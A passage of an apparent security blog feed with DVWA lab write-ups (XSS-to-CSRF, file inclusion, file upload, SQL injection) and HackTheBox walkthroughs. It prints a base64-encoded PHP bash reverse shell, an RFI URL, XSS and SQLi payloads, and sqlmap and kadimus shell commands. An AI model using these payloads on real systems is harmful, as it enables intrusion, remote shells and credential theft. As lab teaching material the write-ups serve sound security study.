  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[-] Usage: </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> &lt;lhost&gt; &lt;lport&gt; &lt;target_url&gt;"</span><span class="p">)</span>
    <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
  <span class="n">main</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]),</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">])</span>
  <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Testing it locally with <code class="language-plaintext highlighter-rouge">curl</code>, my program seems to be working;</p>

<p><img src="/assets/img/20220324084227.png" alt="" /></p>

<p>Now we can set our stored XSS exploit to redirect user to our HTTP redirector, which will further redirect to our CSRF URL. The first redirect can be achieved using <code class="language-plaintext highlighter-rouge">&lt;img&gt;</code> tag with a broken URL that executes the JS code defined by <code class="language-plaintext highlighter-rouge">onerror</code>;</p>

<p><img src="/assets/img/20220324084649.png" alt="" /></p>

<p><img src="/assets/img/20220324084837.png" alt="" /></p>

<p>Going to the XSS page as <strong>admin</strong>, our exploit was triggered;</p>

<p><img src="/assets/img/20220324085046.png" alt="" /></p>

<p><img src="/assets/img/20220324085206.png" alt="" /></p>

<p>The password reset worked, but the exploit is very obvious. So I tried doing it with the payload <code class="language-plaintext highlighter-rouge">&lt;img src='&lt;my-redirectors-URL&gt;'/&gt;</code>, and it worked. This is much more stealthier since target is not <em>visibly</em> redirected.</p>

<p><br /></p>

<h4 id="difficulty-high">Difficulty: High</h4>
<p><br /></p>

<p>Same password reset form as the previous levels, and the XSS payload used in [[#Difficulty Medium]] worked for this level too;</p>

<p><img src="/assets/img/20220324093512.png" alt="" /></p>

<p><img src="/assets/img/20220324093458.png" alt="" /></p>

<p>Going to the stored XSS infected page changed the password of <em>admin</em> to <code class="language-plaintext highlighter-rouge">hacked3</code>.</p>]]></content><author><name></name></author><category term="dvwa" /><category term="dvwa" /><category term="stored xss" /><category term="csrf" /><summary type="html"><![CDATA[This is an exercise in OWASP DVWA where I chained Stored XSS with CSRF.]]></summary></entry><entry><title type="html">File Inclusion - DVWA</title><link href="https://4g3nt47.github.io/posts/dvwa/dvwa_file_inclusion.html" rel="alternate" type="text/html" title="File Inclusion - DVWA" /><published>2022-03-27T00:00:00+01:00</published><updated>2022-03-27T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/dvwa/dvwa_file_inclusion</id><content type="html" xml:base="https://4g3nt47.github.io/posts/dvwa/dvwa_file_inclusion.html"><![CDATA[<p>This is an exercise in OWASP DVWA for local and remote file inclusion.</p>

<p><br /></p>

<h3 id="file-inclusion---dvwa">File Inclusion - DVWA</h3>
<p><br /></p>

<h4 id="difficulty-low">Difficulty: Low</h4>
<p><br /></p>

<p>In this mode, we are presented with <strong>3</strong> URLs, both of which accept a filename as a value to the GET parameter <code class="language-plaintext highlighter-rouge">page</code>;</p>

<p><img src="/assets/img/20220324114353.png" alt="" /></p>

<p><img src="/assets/img/20220324114404.png" alt="" /></p>

<p>Changing the value to <code class="language-plaintext highlighter-rouge">/etc/hostname</code> gave me the hostname of the box, along with the rest of the page;</p>

<p><img src="/assets/img/20220324114631.png" alt="" /></p>

<p>That’s cool and all, but we want to see if we can get RCE using this <em>file inclusion</em> vulnerability. Since the default files assigned to the <code class="language-plaintext highlighter-rouge">page</code> parameter all end with <code class="language-plaintext highlighter-rouge">.php</code>, and no PHP code was seen in the HTML returned by the server, this indicate the file is not just read, but processed as PHP code. This means we can get code execution if we can trick the application into loading a malicious PHP file.</p>

<p>So I started testing for <em>remote file inclusion</em> vulnerability, which will make it much easier to execute arbitrary code, and it was found to be vulnerable;</p>

<p><img src="/assets/img/20220324115551.png" alt="" /></p>

<p><img src="/assets/img/20220324115607.png" alt="" /></p>

<p>So I created a PHP file that will execute a bash reverse shell, and saved it as <code class="language-plaintext highlighter-rouge">shell.php</code>;</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="s2">"echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMC4xLzQ0NDQgMD4mMQ== | base64 -d | bash"</span><span class="p">);</span><span class="cp">?&gt;</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Going to the URL <code class="language-plaintext highlighter-rouge">http://buster/dvwa/vulnerabilities/fi/?page=http://172.17.0.1/shell.php</code> gave me a shell on the box;</p>

<p><img src="/assets/img/20220324115844.png" alt="" /></p>

<p><img src="/assets/img/20220324115859.png" alt="" /></p>

<p><br /></p>

<h4 id="difficulty-medium">Difficulty: Medium</h4>
<p><br /></p>

<p>In this mode, LFI was achieved by setting <code class="language-plaintext highlighter-rouge">page=/etc/hostname</code>;</p>

<p><img src="/assets/img/20220324120217.png" alt="" /></p>

<p>However, RFI no longer works when supplying a HTTP URL. This is probably due to some sort of filter the application is using. Fun fact about URL protocols: they are <strong>case insensitive</strong>. So <code class="language-plaintext highlighter-rouge">http://somehost.tld</code> is same as <code class="language-plaintext highlighter-rouge">HTTP://somehost.tld</code>. This could be used to easily bypass filters that do not account for this. Testing this on the application, i was able to achieve RFI, and gain code execution;</p>

<p><img src="/assets/img/20220324120753.png" alt="" /></p>

<p><img src="/assets/img/20220324120807.png" alt="" /></p>

<p><br /></p>

<h4 id="difficulty-high">Difficulty: High</h4>
<p><br /></p>

<p>None of our previous LFI and RFI payloads work in this level. I was able to achieve LFI on the application using the <code class="language-plaintext highlighter-rouge">file:///</code> protocol;</p>

<p><img src="/assets/img/20220324121427.png" alt="" /></p>

<p>Testing for file inclusion using <code class="language-plaintext highlighter-rouge">php://filter/convert.base64-encode/resource=&lt;file&gt;</code>, which could have being used to read the source code of the application for analysis, kept failing.</p>

<p>The LFI is still enough for RCE if we can chain it we any other vulnerability that allow us to write files on the server, and <em>DVWA</em> is vulnerable to arbitrary file upload.</p>

<p><br /></p>

<h4 id="bonus-lfi-to-rce-with-kadimus">Bonus: LFI to RCE with Kadimus</h4>
<p><br /></p>

<p><strong>Kadimus</strong> is a nice tool that can be used to easily scan for and exploit LFI vulnerabilities, and you can install it from <a href="https://github.com/P0cL4bs/kadimus">github</a>.</p>

<p>Running the tool using the command;</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>kadimus <span class="nt">-u</span> <span class="s1">'http://buster/dvwa/vulnerabilities/fi/?page=include.php'</span> <span class="nt">--cookie</span> <span class="s1">'security=low; PHPSESSID=p40eq58f52c6e08rku3gb6leb8'</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">kadimus</code> was able to detect a few ways the application is vulnerable to LFI;</p>

<p><img src="/assets/img/20220327092755.png" alt="" /></p>

<p>Best thing about <code class="language-plaintext highlighter-rouge">kadimus</code> is it makes it very easy to go from LFI to <em>code execution</em>. Using the <em>data wrap</em> technique, this can be exploited with the command;</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>kadimus <span class="nt">-u</span> <span class="s1">'http://buster/dvwa/vulnerabilities/fi/?page=include.php'</span> <span class="nt">--cookie</span> <span class="s1">'security=low; PHPSESSID=p40eq58f52c6e08rku3gb6leb8'</span> <span class="nt">-T</span> data <span class="nt">--parameter</span> page <span class="nt">--shell</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>This gave me a shell on the box;</p>

<p><img src="/assets/img/20220327092942.png" alt="" /></p>

<p>The shell you get with <code class="language-plaintext highlighter-rouge">kadimus</code> is stateless, so you may want to upgrade to a proper shell as soon as you have code execution;</p>

<p><img src="/assets/img/20220327093253.png" alt="" /></p>]]></content><author><name></name></author><category term="dvwa" /><category term="dvwa" /><category term="lfi" /><category term="rfi" /><category term="rce" /><category term="kadiums" /><summary type="html"><![CDATA[This is an exercise in OWASP DVWA for local and remote file inclusion.]]></summary></entry><entry><title type="html">File Upload- DVWA</title><link href="https://4g3nt47.github.io/posts/dvwa/dvwa_file_upload.html" rel="alternate" type="text/html" title="File Upload- DVWA" /><published>2022-03-27T00:00:00+01:00</published><updated>2022-03-27T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/dvwa/dvwa_file_upload</id><content type="html" xml:base="https://4g3nt47.github.io/posts/dvwa/dvwa_file_upload.html"><![CDATA[<p>This is an exercise in OWASP DVWA for exploiting file upload vulnerabilities.</p>

<p><br /></p>

<h3 id="file-upload---dvwa">File Upload - DVWA</h3>
<p><br /></p>

<h4 id="difficulty-easy">Difficulty: Easy</h4>
<p><br /></p>

<p>In this mode, we are presented with a file upload form;</p>

<p><img src="/assets/img/20220324202555.png" alt="" /></p>

<p>As expected, there is no filter, and I was able to upload a PHP code that execute a bash reverse shell;</p>

<p><img src="/assets/img/20220324203110.png" alt="" /></p>

<p>The web application is kind enough to give us the path of the upload. Going to the URL, I got a shell on the box;</p>

<p><img src="/assets/img/20220324203321.png" alt="" /></p>

<p><img src="/assets/img/20220324203255.png" alt="" /></p>

<p><br /></p>

<h4 id="difficulty-medium">Difficulty: Medium</h4>
<p><br /></p>

<p>Attempt to upload a PHP file failed, saying only JPEG or PNG images are accepted;</p>

<p><img src="/assets/img/20220324203601.png" alt="" /></p>

<p>This means the web application is now filtering our uploads, which means we need to play around with the upload request. <code class="language-plaintext highlighter-rouge">mitmproxy</code> does not work well with multipart forms in my experience, so I fired up burp, and this is what a failed upload of a PHP file look like;</p>

<p><img src="/assets/img/20220324205409.png" alt="" /></p>

<p>Changing the <code class="language-plaintext highlighter-rouge">Content-Type</code> parameter to <code class="language-plaintext highlighter-rouge">image/png</code> successfully bypassed the filter, and gave us code execution;</p>

<p><img src="/assets/img/20220324205549.png" alt="" /></p>

<p><img src="/assets/img/20220324205650.png" alt="" /></p>

<p><br /></p>

<h4 id="difficuly-hard">Difficuly: Hard</h4>
<p><br /></p>

<p>In this mode, the application appears to be filtering files based on their contents because changing the file extension, as well as the value of the <code class="language-plaintext highlighter-rouge">Content-Type</code> parameter didn’t work;</p>

<p><img src="/assets/img/20220324210238.png" alt="" /></p>

<p>A good way to get around this is using <em>magic bytes</em>, which are series of bytes, normally at the beginning of a file, that are unique to that file type. So I created a normal PNG file named <code class="language-plaintext highlighter-rouge">test.png</code>, and used <code class="language-plaintext highlighter-rouge">head</code> to extract the first 20 bytes it has and prefixed it to our PHP payload;</p>

<p><img src="/assets/img/20220324210755.png" alt="" /></p>

<p>This approach worked, but the web app is also filtering file extension, so I was unable to gain code execution. However, this can still be exploited to gain code execution by chaining it with the LFI vuln in DVWA.</p>]]></content><author><name></name></author><category term="dvwa" /><category term="dvwa" /><category term="file upload" /><category term="rce" /><category term="magic bytes" /><summary type="html"><![CDATA[This is an exercise in OWASP DVWA for exploiting file upload vulnerabilities.]]></summary></entry><entry><title type="html">Error-based SQL Injection- DVWA</title><link href="https://4g3nt47.github.io/posts/dvwa/dvwa_sqli_error_based.html" rel="alternate" type="text/html" title="Error-based SQL Injection- DVWA" /><published>2022-03-27T00:00:00+01:00</published><updated>2022-03-27T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/dvwa/dvwa_sqli_error_based</id><content type="html" xml:base="https://4g3nt47.github.io/posts/dvwa/dvwa_sqli_error_based.html"><![CDATA[<p>This is an exercise in OWASP DVWA for exploiting SQL injection.</p>

<p><br /></p>

<h3 id="error-based-sql-injection---dvwa">Error-based SQL Injection - DVWA</h3>
<p><br /></p>

<h4 id="difficulty-easy">Difficulty: Easy</h4>
<p><br /></p>

<p>In this mode, we are presented with a form to enter a user ID, which is used to display the first name and surname of a user;</p>

<p><img src="/assets/img/20220327073156.png" alt="" /></p>

<p><img src="/assets/img/20220327073215.png" alt="" /></p>

<p>Adding a single quote to the input gave an SQL error;</p>

<p><img src="/assets/img/20220327073331.png" alt="" /></p>

<p>This means we have an <em>error-based SQL injection</em>. The payload <code class="language-plaintext highlighter-rouge">1' order by 2-- -</code> didn’t give any error, but <code class="language-plaintext highlighter-rouge">1' order by 3-- -</code> did, which means the query we are injecting to is retrieving <strong>2</strong> columns. Injecting a <em>union</em> query showed that both columns are reflected in the response;</p>

<p><img src="/assets/img/20220327073838.png" alt="" /></p>

<p>Name of the current database;</p>

<p><img src="/assets/img/20220327073933.png" alt="" /></p>

<p>Existing databases;</p>

<p><img src="/assets/img/20220327074422.png" alt="" /></p>

<p>Tables in <code class="language-plaintext highlighter-rouge">dvwa</code> databases;</p>

<p><img src="/assets/img/20220327074739.png" alt="" /></p>

<p><code class="language-plaintext highlighter-rouge">users</code> looks interesting. Let’s see what columns it have;</p>

<p><img src="/assets/img/20220327074942.png" alt="" /></p>

<p>Looks like this table is used to store user credentials;</p>

<p><img src="/assets/img/20220327075345.png" alt="" /></p>

<p>I copied these hashes to a format <code class="language-plaintext highlighter-rouge">john</code> can process, and was able to crack them;</p>

<p><img src="/assets/img/20220327075721.png" alt="" /></p>

<p><br /></p>

<h4 id="difficulty-medium">Difficulty: Medium</h4>
<p><br /></p>

<p>In this mode, the form is different. It uses a set of predefined user IDs as input;</p>

<p><img src="/assets/img/20220327080027.png" alt="" /></p>

<p>This means we will have to rely on a proxy for injection. Intercepting the request in <code class="language-plaintext highlighter-rouge">mitmproxy</code> and testing for SQL injection using a single quote gave an error;</p>

<p><img src="/assets/img/20220327080425.png" alt="" /></p>

<p>Same thing happens when injecting with double quotes. Injecting without any quote worked, which means the application is likely injecting the user input directly without enclosing in quote, which will work since the developer expects the input to be an integer;</p>

<p><img src="/assets/img/20220327080751.png" alt="" /></p>

<p>This injection can be exploited much more conveniently using tools like <code class="language-plaintext highlighter-rouge">sqlmap</code>, and I was able to use it to dump the hashes in the <code class="language-plaintext highlighter-rouge">users</code> table;</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>sqlmap <span class="nt">-u</span> <span class="s1">'http://buster/dvwa/vulnerabilities/sqli/'</span> <span class="nt">--data</span> <span class="s1">'id=1&amp;Submit=Submit'</span> <span class="nt">--cookie</span> <span class="s1">'security=medium; PHPSESSID=5c8siun1tr567gd519v1mivcbi'</span> <span class="nt">-D</span> dvwa <span class="nt">-T</span> <span class="nb">users</span> <span class="nt">--dump</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p><img src="/assets/img/20220327081759.png" alt="" /></p>

<p><br /></p>

<h4 id="difficulty-high">Difficulty: High</h4>
<p><br /></p>

<table>
  <tbody>
    <tr>
      <td>This mode also gives a different form. The payload used in [[06 - SQL Injection - Error-based#Difficulty Easy</td>
      <td>easy mode]] also worked in this mode, the only twist is that a seperate window is created in browser for user input, while the results are displayed in the main window;</td>
    </tr>
  </tbody>
</table>

<p><img src="/assets/img/20220327082145.png" alt="" /></p>]]></content><author><name></name></author><category term="dvwa" /><category term="dvwa" /><category term="sql injection" /><category term="sqlmap" /><summary type="html"><![CDATA[This is an exercise in OWASP DVWA for exploiting SQL injection.]]></summary></entry><entry><title type="html">Secret - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/secret.html" rel="alternate" type="text/html" title="Secret - HackTheBox" /><published>2022-03-26T00:00:00+01:00</published><updated>2022-03-26T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/secret</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/secret.html"><![CDATA[<p><strong>Secret</strong> is an easy linux box where you have to exploit a <em>sensitive information</em> leak in a git repo to recover a JWT secret, which allows you to forge a JWT token that gives you access to an API endpoint that’s vulnerable to <em>command injection</em>. Once on the box, you will be exploiting a custom SUID binary that allows for core dumping.</p>

<p><br /></p>

<h3 id="info">Info</h3>
<p><br /></p>

<p><img src="/assets/img/20211031081337.png" alt="" /></p>

<p><img src="/assets/img/20211031081355.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="recon">Recon</h3>
<p><br /></p>

<h4 id="nmap">NMAP</h4>

<pre><code class="language-raw"># Nmap 7.70 scan initiated Sat Oct 30 20:00:45 2021 as: nmap -sV -sC -v -oN nmap.txt 10.10.11.120
Nmap scan report for secret.htb (10.10.11.120)
Host is up (0.25s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: DUMB Docs
3000/tcp open  http    Node.js (Express middleware)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: DUMB Docs
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Oct 30 20:01:41 2021 -- 1 IP address (1 host up) scanned in 56.17 seconds
</code></pre>

<h4 id="web">Web</h4>

<p><img src="/assets/img/20211031081510.png" alt="" /></p>

<p><img src="/assets/img/20211031082706.png" alt="" /></p>

<p>The <code class="language-plaintext highlighter-rouge">/doc</code> path in the website provides a demo for creating and accessing accounts using the API;</p>

<p><img src="/assets/img/20211031081706.png" alt="" /></p>

<p>Possible credential?</p>

<p><img src="/assets/img/20211031081811.png" alt="" /></p>

<p>Account login;</p>

<p><img src="/assets/img/20211031081837.png" alt="" /></p>

<p>There is a link to download source code in the homepage;</p>

<p><img src="/assets/img/20211031081959.png" alt="" /></p>

<p>It is a ZIP file, which I download and extract. It contains a <code class="language-plaintext highlighter-rouge">.git</code> folder in the root, so it’s a GIT repository. Running <code class="language-plaintext highlighter-rouge">git log</code> command showed something interesting;</p>

<p><img src="/assets/img/20211031082300.png" alt="" /></p>

<p>So I ran the <code class="language-plaintext highlighter-rouge">git diff</code> command using the commit ID to see what changes were made, and I got the token used to sign JWT tokens as indicated by the file <code class="language-plaintext highlighter-rouge">routes/verifytoken.js</code>;</p>

<p><img src="/assets/img/20211031082359.png" alt="" /></p>

<p><img src="/assets/img/20211031082447.png" alt="" /></p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">jwt</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">jsonwebtoken</span><span class="dl">"</span><span class="p">);</span>

<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">header</span><span class="p">(</span><span class="dl">"</span><span class="s2">auth-token</span><span class="dl">"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">token</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">401</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="dl">"</span><span class="s2">Access Denied</span><span class="dl">"</span><span class="p">);</span>

    <span class="k">try</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">verified</span> <span class="o">=</span> <span class="nx">jwt</span><span class="p">.</span><span class="nx">verify</span><span class="p">(</span><span class="nx">token</span><span class="p">,</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">TOKEN_SECRET</span><span class="p">);</span>
        <span class="nx">req</span><span class="p">.</span><span class="nx">user</span> <span class="o">=</span> <span class="nx">verified</span><span class="p">;</span>
        <span class="nx">next</span><span class="p">();</span>
    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="dl">"</span><span class="s2">Invalid Token</span><span class="dl">"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">};</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The login API is also vulnerable to user enumeration as login attempt using a valid email with a bad password said <strong>Password is wrong</strong>, while attempt with invalid email says <strong>Email is wrong</strong>.</p>

<p><br /></p>

<hr />
<h3 id="foothold">Foothold</h3>
<p><br /></p>

<p>Using <em>Burp Suite</em>, I was able to create an account using the following request;</p>

<p><img src="/assets/img/20211031084145.png" alt="" /></p>

<p>Logging into the account gave me a token, which I forged on https://jwt.io using the JWT secret obtained, and changed the username to <code class="language-plaintext highlighter-rouge">theadmin</code> (the administrative username obtained by going through the source files). Using the forged token, request to <code class="language-plaintext highlighter-rouge">/api/priv</code> showed I am now the admin;</p>

<p><img src="/assets/img/20211031084644.png" alt="" /></p>

<p>I am now authenticated as an admin, but still have no idea how to utilise the API.</p>

<p>Using the <code class="language-plaintext highlighter-rouge">package.json</code> file in the root of the repo, which contains dependencies of the project and their version numbers, I started looking for exploits online, but couldn’t find anything interesting. So I continue to enumerate previous commits using <code class="language-plaintext highlighter-rouge">git diff</code>, and found an interesting commit with the ID <code class="language-plaintext highlighter-rouge">e297a2797a5f62b6011654cf6fb6ccb6712d2d5b</code>;</p>

<p><img src="/assets/img/20211031100641.png" alt="" /></p>

<p>That looks like a shell command that can be exploited if I can control the value of <code class="language-plaintext highlighter-rouge">req.query.file</code>. Crafting a request in <em>Burp Suite</em> for the endpoint, I got this;</p>

<p><img src="/assets/img/20211031101119.png" alt="" /></p>

<p>I assumed <code class="language-plaintext highlighter-rouge">req.query</code> is used to store all queries defined in the request, so I added a GET parameter named <code class="language-plaintext highlighter-rouge">file</code> with a test value, and it got included in the command;</p>

<p><img src="/assets/img/20211031101334.png" alt="" /></p>

<p>Injecting an encoded bash reverse shell in the <code class="language-plaintext highlighter-rouge">file</code> parameter, I got a shell as the user <strong>dasith</strong>;</p>

<p><img src="/assets/img/20211031101959.png" alt="" /></p>

<p><img src="/assets/img/20211031102057.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="privesc">PrivEsc</h3>
<p><br /></p>

<p>Can’t list sudo permissions for the user as I still don’t have his password. <code class="language-plaintext highlighter-rouge">netstat</code> showed a service running locally, which was identified as <em>MongoDB</em> using <code class="language-plaintext highlighter-rouge">telnet</code>;</p>

<p><img src="/assets/img/20211031102910.png" alt="" /></p>

<p>Checking the <code class="language-plaintext highlighter-rouge">.env</code> file, I got a path for the service;</p>

<p><img src="/assets/img/20211031103224.png" alt="" /></p>

<p>The user does not have SSH public key authentication setup, so I used <code class="language-plaintext highlighter-rouge">ssh-keygen</code> to setup one, so I can setup port-forwarding to the MongoDB service over SSH. I still got the same error when trying to access the MongoDB service over HTTP.</p>

<p>After reading up on <em>MongoDB</em>, I found a cheatsheet at https://gist.github.com/michaeltreat/d3bdc989b54cff969df86484e091fd0c that helped me enumerate the service. I found a database named <code class="language-plaintext highlighter-rouge">web-auth</code> containing four (4) hashes;</p>

<p><img src="/assets/img/20211031104847.png" alt="" /></p>

<p><img src="/assets/img/20211031104911.png" alt="" /></p>

<p>Attempt to crack the hashes using <code class="language-plaintext highlighter-rouge">john</code> was taking way too long, so I aborted it and move on. One of the hashes was eventually cracked, but didn’t give me access to anything.</p>

<p>Inside <code class="language-plaintext highlighter-rouge">/opt/</code>, I found a SUID binary owned by root, and what looks like the source code. Running it, it asks for a filename, and then report some stats for the file;</p>

<p><img src="/assets/img/20211031110157.png" alt="" /></p>

<p>Privileges are dropped when saving results, which means I can’t write anything to protected paths. Attempts to step through the process while loading protected files using <code class="language-plaintext highlighter-rouge">strace</code> and <code class="language-plaintext highlighter-rouge">gdb</code> failed because they can’t attach to a process of higher privileges.</p>

<p>Going through the source code, I noticed core dumping was enabled;</p>

<p><img src="/assets/img/20211101174829.png" alt="" /></p>

<p>Fuzzing the program’s input did not cause the program to crash. After taking a sanity check, I realized I could cause a program to crash and dump core by sending it a SIGSEGV (signal ID: 11). Running <code class="language-plaintext highlighter-rouge">kill -n 11 &lt;PID&gt;</code> while the program is asking where the results should be saved, I was able to crash it;</p>

<p><img src="/assets/img/20211101175418.png" alt="" /></p>

<p>Checking <code class="language-plaintext highlighter-rouge">/var/crash</code>, I found the crash file generated;</p>

<p><img src="/assets/img/20211101175510.png" alt="" /></p>

<p>After googling around, I learned that such crash files can be processed using <code class="language-plaintext highlighter-rouge">apport-unpack</code> tool, so I did;</p>

<p><img src="/assets/img/20211101175648.png" alt="" /></p>

<p>The file <code class="language-plaintext highlighter-rouge">CoreDump</code> was identified as the core dump;</p>

<p><img src="/assets/img/20211101175813.png" alt="" /></p>

<p>So I load it in the <code class="language-plaintext highlighter-rouge">gdb</code> installed on the host, and searched the memory mappings of the program using the<code class="language-plaintext highlighter-rouge">find</code> command, and manually go through the stack using <code class="language-plaintext highlighter-rouge">x/s &lt;some-address&gt;</code>, but could only locate the name of the file (<code class="language-plaintext highlighter-rouge">/root/.ssh/id_rsa</code>) that was given to the SUID binary before the crash. With the help of the <code class="language-plaintext highlighter-rouge">strings</code> command-line tool, I was able to extract the private key of <code class="language-plaintext highlighter-rouge">root</code> (which was the file given to the binary before the crash);</p>

<p><img src="/assets/img/20211101180210.png" alt="" /></p>

<p>I used the key to gain access to the box as <code class="language-plaintext highlighter-rouge">root</code> over SSH;</p>

<p><img src="/assets/img/20211101180443.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li>Identified running services with <code class="language-plaintext highlighter-rouge">nmap</code></li>
  <li>Used the documentation to create an account on the web API.</li>
  <li>Found the JWT token signing key in a previous commit in the source files using <code class="language-plaintext highlighter-rouge">git diff</code>, and used it to forge a token for the admin user.</li>
  <li>Found the path <code class="language-plaintext highlighter-rouge">/api/logs</code> that’s accessible only to admins is vulnerable to command injection, which I exploited to gain access to the box as the user <code class="language-plaintext highlighter-rouge">dasith</code></li>
  <li>Inside the box as <code class="language-plaintext highlighter-rouge">dasith</code>;
    <ul>
      <li>Exploited a SUID binary by causing it to core dump after reading the private SSH key of the root user.</li>
      <li>Retrieved the SSH key in the crash file using <code class="language-plaintext highlighter-rouge">apport-unpack</code> and <code class="language-plaintext highlighter-rouge">strings</code>, and gained root access to the box over SSH.</li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="api" /><category term="nodejs" /><category term="static analysis" /><category term="git" /><category term="jwt" /><category term="command injection" /><category term="information disclosure" /><category term="tunneling" /><category term="apport" /><category term="custom exploitation" /><summary type="html"><![CDATA[Secret is an easy linux box where you have to exploit a sensitive information leak in a git repo to recover a JWT secret, which allows you to forge a JWT token that gives you access to an API endpoint that’s vulnerable to command injection. Once on the box, you will be exploiting a custom SUID binary that allows for core dumping.]]></summary></entry><entry><title type="html">Devzat - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/devzat.html" rel="alternate" type="text/html" title="Devzat - HackTheBox" /><published>2022-03-12T00:00:00+01:00</published><updated>2022-03-12T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/devzat</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/devzat.html"><![CDATA[<p><strong>Devzat</strong> is a pretty easy <em>medium</em> linux box. It starts with a website that inform you about a chat service on the host accessible on port <strong>8000</strong>. Some enumeration will yield a hidden subdomain that’s vulnerable to <em>command injection</em>. Once inside the box, there is an instance of <em>InfluxDB</em> running locally that’s vulnerable to <strong>CVE-2019-20933</strong>, which you can use to gain access to the box as another local user. Privesc involves exploiting a <em>path traversal</em> flaw in a custom code.</p>

<p><br /></p>

<h3 id="info">Info</h3>
<p><br /></p>

<p><img src="/assets/img/20211017084731.png" alt="" /></p>

<p><img src="/assets/img/20211017084810.png" alt="" />
<br /></p>

<hr />
<h3 id="recon">Recon</h3>
<p><br /></p>

<h4 id="nmap">NMAP</h4>

<pre><code class="language-raw"># Nmap 7.70 scan initiated Sun Oct 17 08:49:05 2021 as: nmap -sV -sC -oN nmap.txt 10.10.11.118
Nmap scan report for 10.10.11.118
Host is up (0.23s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41
